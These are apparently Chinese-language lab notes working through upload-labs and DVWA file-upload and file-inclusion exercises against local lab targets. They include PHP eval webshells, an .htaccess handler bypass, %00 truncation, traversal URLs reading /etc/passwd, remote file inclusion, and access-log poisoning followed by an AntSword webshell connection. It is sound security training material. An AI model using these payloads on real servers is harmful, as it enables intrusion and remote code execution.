# 一、文件上传
## 前置准备
### 靶场
```shell
docker pull cuer/upload-labs
# 启动
docker run -d -p 8081:80 cuer/upload-labs
```
![Alt text](image.png)
### 文件上传利用的三个条件
* 能不能上传：是指有没有文件上传的点，例如上传头像，上传附件，发布图片等等。
* 保存在哪：是指上传上去文件的访问位置，我们是否可以访问。
* 能不能运行：是指上传上去的文件是否可以被服务器所执行。
## 1. 客户端绕过练习。
当前端做了一些安全防护校验的情况下，可以使用下面的方式进行客户端绕过。
### 1.1 禁用js（pass01）
#### 1.1.1 页面正常功能介绍
![Alt text](image-1.png)   
页面通过点击`浏览`按钮进行本地文件选择，点击`上传`之后将选中的文件上传至服务器。   
![Alt text](image-2.png)
#### 1.1.2 尝试上传一句话木马的`php`文件
```php
 <?php phpinfo();?>
```
![Alt text](image-3.png)   
网站提示只允许上传.jpg|.png|.gif格式图片，接下来判断此限制来源于前端还是服务端。
#### 1.1.3 打开浏览器控制台，查看是否有网络请求
![Alt text](image-4.png)   
点击`上传`。
![Alt text](image-5.png)   
我们发现并没有发送网络请求，由此可以判断为前端校验，那么接下来尝试使用`JS绕过`的方式，查看是否可以正常上传。
#### 1.1.4 禁用js后，点击`上传`。
##### 火狐浏览器设置方法
![Alt text](image-10.png)
##### 谷歌浏览器设置方法
![Alt text](image-8.png)
![Alt text](image-9.png)   
禁用`js`设置好之后，点击上传`info.php`。
![Alt text](image-11.png)  
成功上传。
#### 1.1.5 访问该文件
![Alt text](image-12.png)
### 1.2 burp 拦截，修改后缀名
前面使用`js绕过`后，将`info.php`修改为`info.png`进行上传，然后尝试使用burp抓包，修改请求中文件的后缀名，其目的是使用`info.png`绕过前端校验，拦截修改为`.php`，是为了保存至服务器为`.php`文件，服务器可以执行。
#### 1.2.1 修改文件名
```shell
mv info.php info.png
```
#### 1.2.2 开启burp,拦截上传请求
![Alt text](image-13.png)
#### 1.2.3 修改文件名为`info.php`
![Alt text](image-14.png)
#### 1.2.4 上传成功，尝试访问
![Alt text](image-15.png)
![Alt text](image-16.png)
### 1.3 修改前端文件
查看前端源码，通过修改前端代码的方式，来跳过安全校验的执行。
#### 1.3.1 查看前端源码
![Alt text](image-17.png)   
看到在`form`提交的时候会触发一个`onsubmit`事件,里面执行了`checkFile()`函数，进一步查看下`checkFile()`函数中的处理逻辑。
![Alt text](image-18.png)   
可以看到，`checkFile()` 函数就是为了校验文件的类型，那么我们删除`onsubmit`事件后尝试直接提交`info.php`文件。
#### 1.3.2 修改前端代码
![Alt text](image-19.png)   
删除标记部分。   
![Alt text](image-20.png)
#### 1.3.3 成功上传 `info.php`
![Alt text](image-21.png)    
尝试访问该文件。   
![Alt text](image-22.png)
## 2. 服务端黑名单绕过：.htaccess 文件绕过。(pass04)
当服务器使用了黑名单拦截的方式，我们可以通过先上传黑名单外的`.htaccess`文件，在`.htaccess`文件中指定后续我们将要上传的`info.png`以php的方式来运行，达到绕过和执行的目的。
```text
 .htaccess 文件是 Apache 服务器中的一个配置文件，他负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现： 网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列 表、配置默认文档等功能。上传.htaccess文件，来绕过黑名单。
```
前提条件：   
* mod_rewrite模块开启。
* AllowOverride All。
### 2.1 查看服务端源码，黑名单明细。
```php
 $deny_ext = array(".php",".php5",".php4",".php3",".php2",".php1",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".pHp1",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".ini");
```
并没有包含 `.htaccess` 文件。
### 2.2 编写 `.htaccess` 文件
```xml
 <FilesMatch "info.jpg"> 
    Sethandler application/x-httpd-php 
 </FilesMatch>
```
仅对 `info.jpg` 生效。
```xml
 <IfModule mime_module>
  SetHandler application/x-httpd-php 
 </IfModule>
```
对目录下所有文件生效。选择第一种，不会影响其他业务。
### 2.3 上传 `.htaccess` 文件
* Mac遇到的问题，`.htaccess` 属于隐藏文件，点击浏览找不到这个文件，修改为`1.htaccess`进行上传，然后使用`burp`抓包后，再修改文件名称。   
![Alt text](image-23.png)
![Alt text](image-24.png)
![Alt text](image-26.png)   
尝试访问   
![Alt text](image-27.png)
### 2.4 上传 `info.jpg` 文件
![Alt text](image-25.png)   
尝试访问   
![Alt text](image-28.png)
## 3. 服务端白名单绕过：%00 截断绕过，要求虚拟机中搭建实验环境，分别实现 GET、POST 方法的绕过。
### 3.1 原理
由于操作系统是C语言或汇编语言编写的，这两种语言在定义字符串时，都是以\0作为字符串的结尾，所以\0也被称为字符串结束标志，或者字符串结束符。操作系统在识别字符串时，当读取到\0字符时，就认为读取到了一个字符串的结束符号。因此，我们可以通过修改数据包，插入\0字符的方式，达到字符串截断的目的。\0要求在经过服务解析后最终在系统中执行时的样式，所以不能直接使用\0，一般使用%00(url编码),0x00(16进制)。这样的下面的url：
```url
 http://wwww.XXX.com/upload/aaa.php%00bbb.jpg
```
整个 `aaa.php%00bbb.jpg` 会在应用层面绕过白名单的限制，但是在系统层面会被解析为 `aaa.php\0bbb.jpg`,`\0`会被认为是结束，所以最终会以`aaa.php`保存至服务器。
### 3.2 利用条件
* php版本小于5.3.4   
* php.ini的magic_quotes_gpc为OFF状态   
* 操作系统是C语言或汇编语言编写
### 3.3 环境搭建
#### 3.3.1 windows虚拟机中安装`phpStudy`
![Alt text](image-29.png)
#### 3.3.2 切换php版本
![Alt text](image-30.png)
#### 3.3.3 修改php.ini的`magic_quotes_gpc`为`OFF`
![Alt text](image-31.png)   
![Alt text](image-32.png)
#### 3.3.4 将文件放入网站根目录中
![Alt text](image-33.png)
![Alt text](image-34.png)   
#### 3.3.5 启动服务，并访问
![Alt text](image-35.png)
![Alt text](image-36.png)   
查看虚拟机中ip，尝试物理机访问该地址。
![Alt text](image-37.png)   
![Alt text](image-38.png)
### 3.4 GET方式绕过（虚拟机中Pass-11）
```php
 <?php eval(@$_GET['a']);?>
```
#### 3.4.1 选择`info.jpg`，上传
![Alt text](image-39.png)
#### 3.4.2 打开 `Burp` 抓包拦截，在请求路径中添加"%00"
![Alt text](image-40.png)
#### 3.4.3 访问
![Alt text](image-41.png)
### 3.5 POST方式绕过（虚拟机中Pass-11）
```php
 <?php eval(@$_POST['a']);?>
```
#### 3.5.1 上传方式和GET一样
![Alt text](image-42.png)
#### 3.5.2 访问
![Alt text](image-43.png)
## 4. 二次渲染绕过。（Pass-17）
### 4.1 工具下载 `Hex Fiend`
![Alt text](image-44.png)
### 4.2 概念
* 二次渲染：是根据用户上传的图片，新生成一个图片，将原始图片删除，将新图片添加到数据库中。比如一些网站根据用户上传的头像生成大中小不同尺寸的图像。
### 4.3 正常上传前后图片比对
![Alt text](image-45.png)   
保存已上传上去的图片为`tu2.png`
![Alt text](image-46.png)
* 问题：`Hex Fiend` 工具未找到对比功能，暂时使用windows虚拟机中的`010 editor`来对比。
* 解决方法：打开两个文件后，点击`file`,选择 `compare 文件1 and 文件2`,就可以了。
![Alt text](image-47.png)   
* 问题：可操作空间太少了，换gif图片来时，换`1.gif`。
![Alt text](image-49.png)
### 4.4 图片中添加一句话木马，然后再次上传
![Alt text](image-48.png)
下载图片，另存为`3.gif`，查看一句话木马是否被渲染去掉了。
![Alt text](image-50.png)
### 4.5 使用文件包含漏洞访问被渲染过的图片。
![Alt text](image-51.png)
# 二、文件包含
## 概念
程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这种文件调用的过程一般被称为文件包含。程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，但正是由于这种灵活性，从而导致客户端可以调用一个恶意文件，造成文件包含漏洞。   
在通过PHP函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，导致意外的文件泄露甚至恶意的代码注入。
## 1. DVWA 环境下包含其他目录的任意 3 个文件，要求使用相对路径。
### 1.1 相对路径和绝对路径
* 绝对路径：目标文件在硬盘上的真实路径（最精确路径）。   
* 相对路径：相对于当前文件位置的路径。
### 1.2 访问`DVWA`中的文件包含页面
![Alt text](image-52.png)
### 1.3 进入容器内，查看其他目录文件，然后使用相对路径访问
当前的目录以及路径如下：   
![Alt text](image-53.png)   
查看上一级目录的文件：
![Alt text](image-54.png)
利用文件包含漏洞，使用相对路径访问上一级目录的 `view_source.php` 文件。   
```url
 http://127.0.0.1:8081/vulnerabilities/fi/?page=../view_source.php
```
![Alt text](image-55.png)   
继续查看其他目录中的文件
![Alt text](image-56.png)   
访问此目录下的 `README.md` 文件。
```url
 http://127.0.0.1:8081/vulnerabilities/fi/?page=../../README.md
```
![Alt text](image-57.png)   
使用足够多的 `../` 访问 `/etc/passwd`
```url
 http://127.0.0.1:8081/vulnerabilities/fi/?page=../../../../../../../../../../../../etc/passwd
```
![Alt text](image-58.png)
## 2. 远程文件包含。
### 2.1 在windows虚拟机中的`upload-labs`，上传一个文件，并可以访问。
![Alt text](image-60.png)
![Alt text](image-59.png)
### 2.2 查看ip，使用虚拟机ip进行访问
![Alt text](image-62.png)
![Alt text](image-63.png)
### 2.3 远程文件包含
```url
http://127.0.0.1:8081/vulnerabilities/fi/?page=http://192.168.228.137/upload-labs/upload/info.txt
```
![Alt text](image-64.png)   
验证容器php版本与包含的php版本：   
`upload-labs` 虚拟机中版本   
![Alt text](image-66.png)   
`dvwa`容器版本   
![Alt text](image-65.png)
## 3. 中间件日志包含绕过，要求使用蚁剑连接成功。
### 3.1 攻击思路
因为对站点的访问都会记录到一个access.log中，当log中如果能够记录一些可执行的恶意代码后，然后访问该日志文件，并让其中的恶意代码能够运行，从而达到远程命令执行的目的。
### 3.2 准备工作：文件日志权限设置
```shell
 chmod -R 755 /var/log/apache2
 chmod -R 644 access.log
```
![Alt text](image-67.png)
### 3.2 通过对站点的访问，植入一句话木马
#### 3.2.1 构造恶意内容，访问站点
```url
 http://127.0.0.1:8081/vulnerabilities/fi/?page=<?php phpinfo();?>
```
#### 3.2.2 访问日志文件
```url
 http://127.0.0.1:8081/vulnerabilities/fi/?page=/var/log/apache2/access.log
```
![Alt text](image-68.png)   
可以发现此处被编码处理了，可以开启 `burp` 抓包修改之后，再次尝试：
![Alt text](image-70.png)
![Alt text](image-71.png)
#### 3.2.3 写入远程命令执行一句话代码
```url
 http://127.0.0.1:8081/vulnerabilities/fi/?page=<?php eval(@$_POST['a']);?>
```
![Alt text](image-72.png)

#### 3.2.4 使用蚁剑连接
基础配置   
![Alt text](image-73.png)   
请求配置（因为需要登录才能访问，所以需要配置身份验证标识，`cookie`）   
![Alt text](image-74.png)   
测试连接   
![Alt text](image-75.png)   
连接成功   
![Alt text](image-76.png)
